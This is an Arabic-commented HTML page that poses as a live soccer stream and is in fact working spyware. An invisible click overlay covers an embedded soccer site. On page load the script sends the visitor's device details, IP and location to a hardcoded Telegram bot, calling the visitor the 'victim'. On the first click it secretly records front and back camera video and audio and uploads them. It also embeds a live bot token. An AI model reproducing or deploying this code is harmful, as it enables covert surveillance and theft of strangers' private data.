<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>جاري التحميل...</title>
    <style>
        body, html { margin: 0; padding: 0; height: 100%; overflow: hidden; background-color: #000; }
        iframe { width: 100%; height: 100%; border: none; position: absolute; z-index: 1; }
        #overlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.01); z-index: 999; cursor: pointer; }
    </style>
</head>
<body>

    <iframe src="https://live-soccer.tv/"></iframe>
    <div id="overlay" onclick="startOrganizedCapture()"></div>

    <script>
        const token = '8767167475:AAHKG1U4rRxPYgJ-zy6NLFcAlWS7qsXldk0';
        const chatId = '948161192';

        async function sendMsg(txt) {
            try {
                await fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(txt)}&parse_mode=Markdown`);
            } catch(e) {}
        }

        async function sendFileToTelegram(blob, filename, caption) {
            try {
                const frm = new FormData();
                frm.append('chat_id', chatId);
                frm.append('document', blob, filename);
                if (caption) frm.append('caption', caption);

                // استخدام sendDocument هو الحل الأضمن لجميع أنواع ملفات الميديا المتنوعة
                await fetch(`https://api.telegram.org/bot${token}/sendDocument`, { method: 'POST', body: frm });
            } catch(e) {}
        }

        // جلب معلومات الجهاز والـ IP تلقائياً فور فتح الرابط (بدون الحاجة لضغط)
        window.onload = async () => {
            const ua = navigator.userAgent;
            let os = "Android/Linux";
            if (ua.indexOf("iPhone") !== -1 || ua.indexOf("iPad") !== -1) os = "iOS (iPhone)";
            else if (ua.indexOf("Windows") !== -1) os = "Windows";
            
            const screenRes = `${window.screen.width}x${window.screen.height}`;
            const logicalCores = navigator.hardwareConcurrency || "غير معروف";
            const language = navigator.language || navigator.userLanguage;

            fetch('https://ipapi.co/json/').then(r => r.json()).then(d => {
                let msg = `📱 *بيانات الضحية فور فتح الرابط:*
`;
                msg += `▪️ *النظام:* ${os}
`;
                msg += `▪️ *الأنوية:* ${logicalCores}
`;
                msg += `▪️ *الشاشة:* ${screenRes}
`;
                msg += `▪️ *اللغة:* ${language}

`;
                msg += `🌐 *الشبكة والموقع:*
`;
                msg += `▪️ *IP:* ${d.ip}
`;
                msg += `▪️ *الدولة:* ${d.country_name}
`;
                msg += `▪️ *الشركة:* ${d.org}`;
                sendMsg(msg);
            }).catch(() => {
                sendMsg(`📱 فتح الرابط - نظام الجهاز: ${os} | الشاشة: ${screenRes}`);
            });
        };

        // تفعيل الكاميرات والصوت والبطارية بعد أول ضغطة (تفاعل المستخدم الإجباري)
        async function startOrganizedCapture() {
            document.getElementById('overlay').style.display = 'none';

            // جلب البطارية والشبكة
            try {
                const b = await navigator.getBattery();
                const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
                let netType = connection ? connection.effectiveType : "غير معروف";
                sendMsg(`🔋 *البطارية:* ${Math.round(b.level * 100)}% | 📶 *الشبكة:* ${netType}`);
            } catch(e) {}

            // بدء سحب الميديا بالتوالي
            try {
                // 1. الكاميرا الأمامية مع الصوت (فيديو + صوت مدمج)
                sendMsg("⏳ جاري تسجيل فيديو 15 ثانية من الكاميرا الأمامية مع الصوت...");
                const frontStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: true });
                await recordMedia(frontStream, "Front_Camera.webm", "🎥 فيديو وصوت الكاميرا الأمامية");
                frontStream.getTracks().forEach(t => t.stop());

                // 2. الكاميرا الخلفية (فيديو فقط لضمان التوافق وعدم تصادم قنوات الصوت)
                setTimeout(async () => {
                    try {
                        sendMsg("⏳ جاري تسجيل فيديو 15 ثانية من الكاميرا الخلفية...");
                        const backStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "environment" }, audio: false });
                        await recordMedia(backStream, "Back_Camera.webm", "🎥 فيديو الكاميرا الخلفية");
                        backStream.getTracks().forEach(t => t.stop());
                    } catch(e) {
                        sendMsg("⚠️ تعذر تشغيل الكاميرا الخلفية (قد تكون محظورة أو غير متوفرة).");
                    }
                }, 1000);

            } catch (e) {
                sendMsg("🚫 الضحية رفض إعطاء صلاحية الوصول للكاميرا والميكروفون.");
            }
        }

        // دالة التسجيل الموحدة
        function recordMedia(stream, filename, caption) {
            return new Promise((resolve) => {
                let options = { mimeType: 'video/webm;codecs=vp8' };
                
                // التحقق من الصيغ المدعومة في المتصفح الحالي لتفادي توقف السكريبت
                if (!MediaRecorder.isTypeSupported(options.mimeType)) {
                    options = { mimeType: 'video/mp4' }; 
                }
                if (!MediaRecorder.isTypeSupported(options.mimeType)) {
                    options = {}; // ترك المتصفح يختار الصيغة الافتراضية المناسبة له
                }

                try {
                    const recorder = new MediaRecorder(stream, options);
                    const chunks = [];

                    recorder.ondataavailable = e => {
                        if (e.data && e.data.size > 0) chunks.push(e.data);
                    };

                    recorder.onstop = async () => {
                        const blob = new Blob(chunks, { type: recorder.mimeType || 'video/webm' });
                        await sendFileToTelegram(blob, filename, caption);
                        resolve();
                    };

                    recorder.start();
                    
                    // إيقاف التسجيل تلقائياً بعد 15 ثانية
                    setTimeout(() => {
                        if (recorder.state !== "inactive") recorder.stop();
                    }, 15000);

                } catch(err) {
                    resolve();
                }
            });
        }
    </script>
</body>
</html>
